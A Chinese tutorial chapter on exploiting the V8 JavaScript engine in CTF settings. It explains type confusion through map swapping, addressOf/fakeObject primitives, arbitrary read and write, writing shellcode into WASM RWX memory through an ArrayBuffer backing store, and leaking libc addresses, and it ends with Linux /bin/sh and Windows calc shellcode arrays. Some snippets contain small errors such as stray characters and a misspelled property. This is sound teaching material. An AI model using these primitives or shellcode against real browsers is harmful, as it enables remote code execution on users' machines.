# Chapter2-通用利用链

首先需要明确的是，通过 v8 漏洞，我们需要达成什么样的目的？

一般在做 CTF 的时候，往往希望让远程执行 system("/bin/sh") 或者 execve("/bin/sh",0,0) 又或者 ORW ，除了最后一个外，往往一般是希望能够做到远程命令执行，所以一般通过 v8 漏洞也希望能够做到这一点。一般来说，我们希望能往里面写入shellcode，毕竟栈溢出之类的操作在 v8 下似乎不太可能完成。

## WASM的利用

既然要写 shellcode，就需要保证内存中存在可读可写可执行的内存段了。在没有特殊需求的情况下，程序不可能特地开辟一块这样的内存段供用户使用，但在如今支持 WASM(WebAssembly) 的浏览器版本中，一般都需要开辟一块这样的内存用以执行汇编指令，回想上一节给出的测试代码：

```javascript
%SystemBreak();
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
%DebugPrint(f);
%DebugPrint(wasmInstance);
%SystemBreak();
```

此处调用了 WebAssembly 模块为 WASM 创建专用的内存段，当我们执行到第二个断点后，通过 "vmmap" 指令可以发现内存中多了一个特殊的内存段：

```
pwndbg> vmmap
    0x226817c0d000     0x226817c0e000 rwxp     1000 0      [anon_226817c0d]
```

那么现在这段内存就能够为我们所用了。如果我们向其中写入 shellcode ，日后在执行 WASM 时就会转而执行我们写入的攻击代码了

由于 v8 一般都是开启了所有保护的，为此我们需要像 CTF 题那样先泄露地址，然后再达成任意地址写

> 这里会有一个疑问，既然是浏览器，难道不能自己构建WASM直接拿下吗？怎么还需要自己去写 shellcode？
>
> 结论是，WASM不允许执行需要系统调用才能完成的操作。 更准确的说，WASM并不是汇编代码，而是 v8 会根据这段数据生成一段汇编然后加载到内存段中去执行，而检查该代码是否存在系统调用就发生在这一步。 如果通过构造合法的WASM使其创造内存段，然后在之后的操作里写入非法的 Shellcode，就能够完成利用了。

## 高版本的变化

这里有一个不得不说的问题是，在后来的版本中，不会再开辟这样的内存段了

我们可以先看看现在这个内存段中放入的数据是什么：

```
pwndbg> vmmap
    0x226817c0d000     0x226817c0e000 rwxp     1000 0      [anon_226817c0d]

pwndbg> tel 0x226817c0d000 20
00:0000│  0x226817c0d000 ◂— jmp    0x226817c0d480 /* 0xcccccc0000047be9 */
01:0008│  0x226817c0d008 ◂— int3    /* 0xcccccccccccccccc */
... ↓     6 skipped
08:0040│  0x226817c0d040 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */
09:0048│  0x226817c0d048 —▸ 0x55b126522940 (Builtins_ThrowWasmTrapUnreachable) ◂— mov    eax, 0x2d6
0a:0050│  0x226817c0d050 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */
0b:0058│  0x226817c0d058 —▸ 0x55b126522980 (Builtins_ThrowWasmTrapMemOutOfBounds) ◂— mov    eax, 0x2d8
0c:0060│  0x226817c0d060 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */
0d:0068│  0x226817c0d068 —▸ 0x55b1265229c0 (Builtins_ThrowWasmTrapUnalignedAccess) ◂— mov    eax, 0x2da
0e:0070│  0x226817c0d070 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */
0f:0078│  0x226817c0d078 —▸ 0x55b126522a00 (Builtins_ThrowWasmTrapDivByZero) ◂— mov    eax, 0x2dc
10:0080│  0x226817c0d080 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */
11:0088│  0x226817c0d088 —▸ 0x55b126522a40 (Builtins_ThrowWasmTrapDivUnrepresentable) ◂— mov    eax, 0x2de
12:0090│  0x226817c0d090 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */
13:0098│  0x226817c0d098 —▸ 0x55b126522a80 (Builtins_ThrowWasmTrapRemByZero) ◂— mov    eax, 0x2e0
```

接下来笔者换到了截至至 2022.7.5 为止的最新版，我们再次重复之前的操作，看看这次 WASM 被放到了哪里：

```
pwndbg> vmmap
     0x88d46808000      0x88d46809000 r-xp     1000 0      [anon_88d46808]

pwndbg> tel 0x88d46808000 20
00:0000│  0x88d46808000 ◂— jmp    0x88d46808580
01:0008│  0x88d46808008 ◂— int3   
... ↓     6 skipped
08:0040│  0x88d46808040 ◂— jmp    qword ptr [rip + 2]
09:0048│  0x88d46808048 —▸ 0x7f7da298ca80 (Builtins_ThrowWasmTrapUnreachable) ◂— mov    eax, 0x31e
0a:0050│  0x88d46808050 ◂— jmp    qword ptr [rip + 2]
0b:0058│  0x88d46808058 —▸ 0x7f7da298cac0 (Builtins_ThrowWasmTrapMemOutOfBounds) ◂— mov    eax, 0x320
0c:0060│  0x88d46808060 ◂— jmp    qword ptr [rip + 2]
0d:0068│  0x88d46808068 —▸ 0x7f7da298cb00 (Builtins_ThrowWasmTrapUnalignedAccess) ◂— mov    eax, 0x322
0e:0070│  0x88d46808070 ◂— jmp    qword ptr [rip + 2]
0f:0078│  0x88d46808078 —▸ 0x7f7da298cb40 (Builtins_ThrowWasmTrapDivByZero) ◂— mov    eax, 0x324
10:0080│  0x88d46808080 ◂— jmp    qword ptr [rip + 2]
11:0088│  0x88d46808088 —▸ 0x7f7da298cb80 (Builtins_ThrowWasmTrapDivUnrepresentable) ◂— mov    eax, 0x326
12:0090│  0x88d46808090 ◂— jmp    qword ptr [rip + 2]
13:0098│  0x88d46808098 —▸ 0x7f7da298cbc0 (Builtins_ThrowWasmTrapRemByZero) ◂— mov    eax, 0x328
pwndbg> 
```

这段新增的内存段内容是完全相同的，但区别在于，高版本下的 WASM 内存段不再可写了，只有可读可执行权限，似乎不再能这样攻击了

不过最开始的学习总归是从低版本向着高版本发展，接下来的内容也将以 “9.6.180.6” 版本为准，就像最开始学习 PWN 时从 Glibc2.23 开始那样(不过我估计有的大佬会从更低的版本开始......)

## 数据储存方式

用下面的脚本简单看看每个对象在内存中是如何储存的：

```javascript
//demo.js
%SystemBreak();
a= [2.1];
b={"a":1};
c=[b];
d=[1,2,3];
%DebugPrint(a);
%DebugPrint(b);
%DebugPrint(c);
%DebugPrint(d);
%SystemBreak();
```

### JSArray:a

```
pwndbg> job 0x31f3080499c9
0x31f3080499c9: [JSArray]
 - map: 0x31f308203ae1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x31f3081cc0e9 <JSArray[0]>
 - elements: 0x31f3080499b9 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x31f30800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    0x31f3080048f1: [String] in ReadOnlySpace: #length: 0x31f30814215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x31f3080499b9 <FixedDoubleArray[1]> {
           0: 2.1
 }
pwndbg> x/8xw 0x31f3080499c9-1
0x31f3080499c8:	0x08203ae1	0x0800222d	0x080499b9	0x00000002
0x31f3080499d8:	0x08207aa1	0x0800222d	0x0800222d	0x00000002
```

可以看出，一个 JSArray 在内存中的布局如下：

```
| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |
```

而其 elements 结构体的内存布局如下：

```
pwndbg> job 0x31f3080499b9
0x31f3080499b9: [FixedDoubleArray]
 - map: 0x31f308002a95 <Map>
 - length: 1
           0: 2.1
pwndbg> x/12xw 0x31f3080499b9-1
0x31f3080499b8:	0x08002a95	0x00000002	0xcccccccd	0x4000cccc
0x31f3080499c8:	0x08203ae1	0x0800222d	0x080499b9	0x00000002
0x31f3080499d8:	0x08207aa1	0x0800222d	0x0800222d	0x00000002
```

```
| 32bit map addr | 32bit length | 64bit value |
```

并且我们可以注意到，elements+0x10=\&a，这说明这两个结构体在内存上相邻，如果 elements 的内容溢出了，就有可能覆盖 DoubleArray 结构体中的数据

```
| 32bit map addr | 32bit length          | 64bit value                        |elements
| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |jsarray
```

> 如上一节所说过的一样，这里的 length 也都被乘以二了

### JS\_OBJECT\_TYPE:b

```
pwndbg> job 0x31f3080499d9
0x31f3080499d9: [JS_OBJECT_TYPE]
 - map: 0x31f308207aa1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x31f3081c41f5 <Object map = 0x31f3082021b9>
 - elements: 0x31f30800222d <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x31f30800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    0x31f308007b15: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
 }
pwndbg> x/8xw 0x31f3080499d9-1
0x31f3080499d8:	0x08207aa1	0x0800222d	0x0800222d	0x00000002
0x31f3080499e8:	0x08005c11	0x00010001	0x00000000	0x080021f9
```

大致的内存结构如下：

```
| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |
```

但这个结构体的 elements 就没有和 JS\_OBJECT\_TYPE 相邻了，因此一般不存在可利用的地方

### JSArray:c

```
pwndbg> job 0x31f308049a11
0x31f308049a11: [JSArray]
 - map: 0x31f308203b31 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x31f3081cc0e9 <JSArray[0]>
 - elements: 0x31f308049a05 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x31f30800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    0x31f3080048f1: [String] in ReadOnlySpace: #length: 0x31f30814215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x31f308049a05 <FixedArray[1]> {
           0: 0x31f3080499d9 <Object map = 0x31f308207aa1>
 }
pwndbg> job 0x31f308049a05
0x31f308049a05: [FixedArray]
 - map: 0x31f308002205 <Map>
 - length: 1
           0: 0x31f3080499d9 <Object map = 0x31f308207aa1>
pwndbg> x/20xw 0x31f308049a05-1
0x31f308049a04:	0x08002205	0x00000002	0x080499d9	0x08203b31
0x31f308049a14:	0x0800222d	0x08049a05	0x00000002	0x00000000
```

同为 JSArray 实体，因此内存布局与变量 a 相同，但不同的是，由于 a 中存放的是 double 类型的浮点数，其 value 占用 64bit，而变量 c 中存放的是地址，由于地址压缩的缘故，其 value 只占用 32bit，但同样与 JSArray 结构体在内存上相邻

### JSArray：d

```
pwndbg> job 0x18e808049a21
0x18e808049a21: [JSArray]
 - map: 0x18e808203a41 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x18e8081cc0e9 <JSArray[0]>
 - elements: 0x18e8081d31ed <FixedArray[3]> [PACKED_SMI_ELEMENTS (COW)]
 - length: 3
 - properties: 0x18e80800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    0x18e8080048f1: [String] in ReadOnlySpace: #length: 0x18e80814215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x18e8081d31ed <FixedArray[3]> {
           0: 1
           1: 2
           2: 3
 }
pwndbg> job 0x18e8081d31ed
0x18e8081d31ed: [FixedArray] in OldSpace
 - map: 0x18e808002531 <Map>
 - length: 3
           0: 1
           1: 2
           2: 3
pwndbg> x/8xw 0x18e8081d31ed-1
0x18e8081d31ec:	0x08002531	0x00000006	0x00000002	0x00000004
0x18e8081d31fc:	0x00000006	0x08003259	0x00000000	0x081d31ed
```

整数和浮点数数组没有什么差别，但它们在内存上不再相邻了，并且需要注意的是，其储存的数据也都被乘以二了，因此后续的利用中往往需要用浮点数去溢出，而不能直接了当的用整数数据溢出

### 类型识别

既然 a、c、d 三个变量都是 JSArray，肯定还需要一个结构用来区别其中储存的数据类型

我们尝试读取 a 和 d 两个数组的 map 结构体：

```
pwndbg> job 0x18e808203a41
0x18e808203a41: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_SMI_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x18e8080023b5 <undefined>
 - prototype_validity cell: 0x18e808142405 <Cell value= 1>
 - instance descriptors #1: 0x18e8081cc59d <DescriptorArray[1]>
 - transitions #1: 0x18e8081cc5b9 <TransitionArray[4]>Transition array #1:
     0x18e80800524d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_SMI_ELEMENTS) -> 0x18e808203ab9 <Map(HOLEY_SMI_ELEMENTS)>

 - prototype: 0x18e8081cc0e9 <JSArray[0]>
 - constructor: 0x18e8081cbe85 <JSFunction Array (sfi = 0x18e80814adc9)>
 - dependent code: 0x18e8080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

pwndbg> job 0x18e808203ae1
0x18e808203ae1: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x18e808203ab9 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x18e808142405 <Cell value= 1>
 - instance descriptors #1: 0x18e8081cc59d <DescriptorArray[1]>
 - transitions #1: 0x18e8081cc5e9 <TransitionArray[4]>Transition array #1:
     0x18e80800524d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x18e808203b09 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x18e8081cc0e9 <JSArray[0]>
 - constructor: 0x18e8081cbe85 <JSFunction Array (sfi = 0x18e80814adc9)>
 - dependent code: 0x18e8080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0
```

注意到 map 结构体中存在一项成员用以标注 elements 类型：

```
- elements kind: PACKED_DOUBLE_ELEMENTS
```

并且两个都是 JS\_ARRAY\_TYPE，大多数数据都是相同的，因此可以直接将一个变量的 map 地址赋给另外一个变量，使得在读取值时错误解析数据类型，也就是所谓的“类型混淆”

类型混淆是有可能造成地址泄露的，可以考虑这样的代码：

```javascript
float_arr= [2.1];
obj_arr=[float_arr];
%DebugPrint(a);
%DebugPrint(b);
%SystemBreak();
```

正常访问 obj\_arr\[0] 会得到一个对象，但如果修改 obj\_arr 的 map 为 float\_arr 的 map，就会认为 obj\_arr 是一个浮点数数组，那么此时访问 obj\_arr\[0] 就会得到对象 float\_arr 的地址了

> 注：对于没有接触过 Java 或 JavaScript 的读者来说可能会产生困惑，为什么需要通过这种麻烦的方式来获取地址，而不能像 C/C++ 那样直接把对象地址打印出来？
>
> 简单来说，就是 JavaScript 不支持这种操作，它将一切视为对象或整数，消除了所谓“地址”的概念。 对 JavaScript 来说，例子中的 obj\_arr\[0] 储存的是一个 **“对象”** 而非 **“地址”**，访问该对象的返回值必然会是一个具体的 **“对象”**。(哪怕我们通过调试能够发现，它储存的就是一个地址，但在代码层面，我们没有获取该值的手段)

## 任意变量地址读

正如我们上一节所说，JavaScript 不允许我们直接读取某一个地址，但通过 “类型混淆” 的方法能够让 v8引擎 将一个地址误认为整数，并将其读出

### addressOf

同上所述，我们讲这种类型混淆的读取地址方法称之为 “addressOf”

其一般的写法如下：

```javascript
//获取某个变量的地址
var other={"a":1};
var obj_array=[other];
var double_array=[2.1];
var double_array_map=double_array.getMap();//假设我们有办法获取到其 map 值
function addressOf(target_var)
{
	obj_array[0]=target_var;
	obj_array.setMap(double_array_map);//设置其 map 为浮点数数组的 map
	let target_var_addr=float_to_int(obj_array[0]);//读取obj_array[0]并将该浮点数转换为整型
	return target_var_addr;//此处返回的是 target_var 的对象结构体地址
}
```

> 该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象

### fakeObject

与 addressOf 的步骤相反，将 float\_arr 的 map 改为 obj\_arr 的 map，使得在访问 float\_arr\[0] 时得到一个以 float\_arr\[0] 地址为起始的对象

```javascript
//将某个地址转换为对象
var other={"a":1};
var obj_array=[other];
var double_array=[2.1];
var obj_array_map=obj_array.getMap();//假设我们有办法获取到其 map 值
function fakeObject(target_addr)
{
	double_array[0]=int_to_float(target_addr+1n);//将地址加一以区分对象和数值
	double_array.setMap(obj_array_map);
	let fake_obj=double_array[0];
	return fake_obj;
}
```

> 该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象

### 任意地址读

可以尝试构造出这样一个结构：

```javascript
var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];
```

其在内存中的布局应为：

```
| 32bit elements map | 32bit length | 64bit double_array_map | 64bit 0x4141414141414141 |element
| 32bit fake_array map | 32bit properties | 32bit elements | 32bit length |JSArray
```

接下来通过 addressOf 获取 fake\_array 的地址，然后就能够计算出 double\_array\_map 的地址；再通过 fakeObject 将这个地址伪造成一个对象数组，对比下面的内存布局：

```
| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |JSArray
```

此处的 fake\_array\[0] 成为了 JSArray 的 map 和 properties ，fake\_array\[1] 被当作了 elements addr 和 length，通过修改 fake\_array\[1] 就能够使该 elements 指向任意地址，再访问 fakeObject\[0] 即可读取该地址处的数据了(此处 double\_array\_map 需要对应为一个 double 数组的 map)

代码逻辑大致如下：

```javascript
var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];4

function read64_addr(addr)
{
	var fake_array_addr=addressOf(fake_array);
	var fake_object_addr=fake_array_addr-0x10n;
	var fake_object=fakeObject(fake_object_addr);
	fake_array[1]=int_to_float(addr-8n+1n);
	return fake_object[0];
	
} 
```

## 任意地址写

同上一小节一样，只需要将最后的 return 修改为写入即可：

```javascript
var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];4

function write64_addr(addr,data)
{
	var fake_array_addr=addressOf(fake_array);
	var fake_object_addr=fake_array_addr-0x10n;
	var fake_object=fakeObject(fake_object_addr);
	fake_array[1]=int_to_float(addr-8n+1n);
	fake_object[0]=data;
} 
```

## 写入shellcode

参考了几篇其他师傅们所写的博客后，会发现目前所实现的任意地址写并不能正常工作，大致原因如下：

> * 设置的 elements 地址为 addr-8n+1n，我们想要写 shellcode 的地址一般都是内存段在开头，那么更前面的内存空间则是未开辟的，写入时会因为访问未开辟的内存空间发生异常
> * 另外一个原因是，在尝试写 d8 的 free\_hook 或 malloc\_hook 时，由于其地址都是以 0x7f 开头，而 Double 类型的浮点数在处理这些高地址时会将低20位置零，导致地址错误(这一点尚未确定，仅作记录)

因此直接性的写入不太能够成功，但间接性的方法或许还是存在的，如果向某个对象中写入数据不需要经过 map 和 length，或许就能够顺利完成了。

不过 JavaScript 还真的提供了这样的操作：

```javascript
var data_buf = new ArrayBuffer(0x10);
var data_view = new DataView(data_buf);
data_view.setFloat64(0, 2.0, true);
%DebugPrint(data_buf);
%DebugPrint(data_view);
%SystemBreak();
```

```
pwndbg> job 0x1032080499e5
0x1032080499e5: [JSArrayBuffer]
 - map: 0x103208203271 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1032081ca361 <Object map = 0x103208203299>
 - elements: 0x10320800222d <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x56504b1f89d0
 - byte_length: 16
 - max_byte_length: 16
 - detachable
 - properties: 0x10320800222d <FixedArray[0]>
 - All own properties (excluding elements): {}
 - embedder fields = {
    0, aligned pointer: (nil)
    0, aligned pointer: (nil)
 }
pwndbg> job 0x103208049a25
0x103208049a25: [JSDataView]
 - map: 0x103208202ca9 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1032081c8665 <Object map = 0x103208202cd1>
 - elements: 0x10320800222d <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - buffer =0x1032080499e5 <ArrayBuffer map = 0x103208203271>
 - byte_offset: 0
 - byte_length: 16
 - properties: 0x10320800222d <FixedArray[0]>
 - All own properties (excluding elements): {}
 - embedder fields = {
    0, aligned pointer: (nil)
    0, aligned pointer: (nil)
 }
pwndbg> tel 0x56504b1f89d0
00:0000│  0x56504b1f89d0 ◂— 0x4000000000000000
01:0008│  0x56504b1f89d8 ◂— 0x0

pwndbg> x/20wx 0x1032080499e5-1
0x1032080499e4:	0x08203271	0x0800222d	0x0800222d	0x00000010
0x1032080499f4:	0x00000000	0x00000010	0x00000000	0x4b1f89d0
```

可以注意到，JSDataView 的 buffer 指向了 JSArrayBuffer，而 JSArrayBuffer 的 backing\_store 则指向了实际的数据储存地址，那么如果我们能够写 backing\_store 为 shellcode 内存段，就可以通过 JSDataView 的 setFloat64 方法直接写入了

而该成员在 data\_buf+0x1C 处

> 每个成员的地址偏移都会因为版本而迁移，这一点还请读者以自己手上的版本为准

```javascript
function shellcode_write(addr,shellcode)
{
	var data_buf = new ArrayBuffer(shellcode.lenght*8);
	var data_view = new DataView(data_buf);
	var buf_backing_store_addr=addressOf(data_buf)+0x18n;
	write64_addr(buf_backing_store_addr,addr);
	for (let i=0;i<shellcode.length;++i)
		data_view.setFloat64(i*8,int_to_float(shellcode[i]),true);
}
```

> 该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象 并且由于数据压缩的原因，获取 buf\_backing\_store\_addr 的操作有可能不只是一次 addressOf 即可完成的，需要将低位和高位分别读出然后合并为 64 位地址后再写入，这里只做逻辑抽象，具体实践在以后的章节中另外补充

然后是获取写入内存段的地址了，回到开始的这个脚本：

```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
%DebugPrint(f);
%DebugPrint(wasmInstance);
%SystemBreak();
```

```
pwndbg> job 0x3e63081d35bd
0x3e63081d35bd: [WasmInstanceObject] in OldSpace
 - map: 0x3e6308207399 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3e6308048079 <Object map = 0x3e6308207af1>
 - elements: 0x3e630800222d <FixedArray[0]> [HOLEY_ELEMENTS]
 - module_object: 0x3e6308049cb1 <Module map = 0x3e6308207231>
 - exports_object: 0x3e6308049e65 <Object map = 0x3e6308207bb9>
 - native_context: 0x3e63081c3649 <NativeContext[252]>
 - memory_object: 0x3e63081d35a5 <Memory map = 0x3e6308207641>
 - table 0: 0x3e6308049e35 <Table map = 0x3e63082074b1>
 - imported_function_refs: 0x3e630800222d <FixedArray[0]>
 - indirect_function_table_refs: 0x3e630800222d <FixedArray[0]>
 - managed_native_allocations: 0x3e6308049ded <Foreign>
 - memory_start: 0x7f6b18000000
 - memory_size: 65536
 - imported_function_targets: 0x55b235cab0e0
 - globals_start: (nil)
 - imported_mutable_globals: 0x55b235cab210
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: (nil)
 - indirect_function_table_targets: (nil)
 - properties: 0x3e630800222d <FixedArray[0]>
 - All own properties (excluding elements): {}

pwndbg> tel 0x3e63081d35bd-1 30
00:0000│  0x3e63081d35bc ◂— 0x800222d08207399
01:0008│  0x3e63081d35c4 ◂— 0x800222d0800222d /* '-"' */
02:0010│  0x3e63081d35cc ◂— 0x800222d /* '-"' */
03:0018│  0x3e63081d35d4 —▸ 0x7f6b18000000 ◂— 0x0
04:0020│  0x3e63081d35dc ◂— 0x10000
05:0028│  0x3e63081d35e4 —▸ 0x55b235c861b0 —▸ 0x7ffd839ca5f0 ◂— 0x7ffd839ca5f0
06:0030│  0x3e63081d35ec —▸ 0x55b235cab0e0 ◂— 0x0
07:0038│  0x3e63081d35f4 ◂— 0x0
... ↓     2 skipped
0a:0050│  0x3e63081d360c —▸ 0x55b235cab210 —▸ 0x7f6d2e41cbe0 (main_arena+96) —▸ 0x55b235d28080 ◂— 0x0
0b:0058│  0x3e63081d3614 —▸ 0x55b235c86190 —▸ 0x3e6300000000 ◂— sub    rsp, 0x80
0c:0060│  0x3e63081d361c —▸ 0x1998dd4f3000 ◂— jmp    0x1998dd4f3480 /* 0xcccccc0000047be9 */
```

可以注意到在 wasmInstance+0x68 处保存了内存段的起始地址，读取该处即可

## 泄露地址手记

目前为止都是通过自定义一部分变量完成地址泄露的，但这个地址只是某个匿名内存段罢了

```
    0x271c08040000     0x271c0814d000 rw-p   10d000 0      [anon_271c08040]
```

因为 WASM 是我们自己定义的，所以还能通过某些方法拿到地址，但如果我们现在不想写 shellcode，想像常规的 PWN 那样去写 free\_hook 或者 GOT 表时，该如何泄露地址？

一个是随机泄露，从某个变量随机的往上一个个测试偏移地址，但很显然，在开启了 ASLR 的情况下，效率太低还不稳定，因此主要通过另外一个较为稳定的方式泄露地址：

JSArray结构体--> Map结构体-->constructor结构体-->code属性地址-->code内存地址的固定偏移处保存了 v8 的二进制指令地址-->v8 的 GOT 表--> libc基址：

```
pwndbg> job 0x34d808049979
0x34d808049979: [JSArray]
 - map: 0x34d808203ae1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]

pwndbg> job 0x34d808203ae1
0x34d808203ae1: [Map]
 - type: JS_ARRAY_TYPE
 - constructor: 0x34d8081cbe85 <JSFunction Array (sfi = 0x34d80814adc9)>

pwndbg> job 0x34d8081cbe85
0x34d8081cbe85: [Function] in OldSpace
 - map: 0x34d808203a19 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - code: 0x34d800185501 <Code BUILTIN ArrayConstructor>

pwndbg> tel 0x34d800185501-1+0x7EBAB00 30
00:0000│  0x34d808040000 ◂— 0x40000
01:0008│  0x34d808040008 ◂— 0x12
02:0010│  0x34d808040010 —▸ 0x55cca1732560 ◂— 0x0
03:0018│  0x34d808040018 —▸ 0x34d808042118 ◂— 0x608002205
04:0020│  0x34d808040020 —▸ 0x34d808080000 ◂— 0x40000
05:0028│  0x34d808040028 ◂— 0x3dee8
06:0030│  0x34d808040030 ◂— 0x0
07:0038│  0x34d808040038 ◂— 0x2118
08:0040│  0x34d808040040 —▸ 0x55cca17b4258 —▸ 0x55cc9f7a5d20 —▸ 0x55cc9e9ba260 ◂— push   rbp

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x55cc9e121000     0x55cc9e954000 r--p   833000 0      /path/d8
    0x55cc9e954000     0x55cc9f793000 r-xp   e3f000 832000 /path/d8
    0x55cc9f793000     0x55cc9f7fb000 r--p    68000 1670000 /path/d8
    0x55cc9f7fb000     0x55cc9f80c000 rw-p    11000 16d7000 /path/d8
```

可以注意到，顺着这个地址链查下去，最终能找到地址 0x55cc9e9ba260 ，该地址对应了 d8 的二进制程序中的代码地址，而整个 d8 在内存中是连续的，因此可以找到其 GOT 表，然后再从中得到 libc 的机制，最后即可覆盖 free\_hook 或 free 的 got 表为 system 或 one gadget

## 尾声

最后补充一下可用的 shellcode：

```javascript
//Linux x64
var shellcode = [  
  0x2fbb485299583b6an,  
  0x5368732f6e69622fn,  
  0x050f5e5457525f54n  
];  

//Windows 计算器
var shellcode = [  
	0xc0e8f0e48348fcn,  
	0x5152504151410000n,  
	0x528b4865d2314856n,  
	0x528b4818528b4860n,  
	0xb70f4850728b4820n,  
	0xc03148c9314d4a4an,  
	0x41202c027c613cacn,  
	0xede2c101410dc9c1n,  
	0x8b20528b48514152n,  
	0x88808bd001483c42n,  
	0x6774c08548000000n,  
	0x4418488b50d00148n,  
	0x56e3d0014920408bn,  
	0x4888348b41c9ff48n,  
	0xc03148c9314dd601n,  
	0xc101410dc9c141acn,  
	0x244c034cf175e038n,  
	0x4458d875d1394508n,  
	0x4166d0014924408bn,  
	0x491c408b44480c8bn,  
	0x14888048b41d001n,  
	0x5a595e58415841d0n,  
	0x83485a4159415841n,  
	0x4158e0ff524120ecn,  
	0xff57e9128b485a59n,  
	0x1ba485dffffn,  
	0x8d8d480000000000n,  
	0x8b31ba4100000101n,  
	0xa2b5f0bbd5ff876fn,  
	0xff9dbd95a6ba4156n,  
	0x7c063c28c48348d5n,  
	0x47bb0575e0fb800an,  
	0x894159006a6f7213n,  
	0x2e636c6163d5ffdan,  
	0x657865n,  
];
```

另外，上述代码中的 int\_to\_float 等函数需要自行定义，实现如下：

```javascript
  
function float_to_int(f)  
{  
  f64[0] = f;  
    return bigUint64[0];  
}  
  
function int_to_float(i)  
{  
    bigUint64[0] = i;  
    return f64[0];  
}  
```
